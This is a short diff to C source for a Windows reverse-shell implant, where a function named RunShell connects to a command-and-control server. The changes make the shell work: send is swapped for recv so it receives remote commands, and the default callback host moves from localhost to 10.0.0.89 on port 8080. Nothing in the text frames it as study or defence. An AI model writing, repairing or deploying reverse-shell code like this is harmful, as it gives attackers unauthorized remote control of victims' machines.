@@ -27,9 +27,8 @@ void RunShell(char* C2Server, int C2Port) {
         }
         else {
             char RecvData[DEFAULT_BUFLEN];
-            char msg[] = "Shell connected";
             memset(RecvData, 0, sizeof(RecvData));
-            int RecvCode = send(mySocket, msg, DEFAULT_BUFLEN, 0);// (mySocket, RecvData, DEFAULT_BUFLEN, 0);
+            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
             if (RecvCode <= 0) {
                 closesocket(mySocket);
                 WSACleanup();
@@ -72,7 +71,7 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "127.0.0.1";
+        char host[] = "10.0.0.89";
         int port = 8080;
         RunShell(host, port);
     }
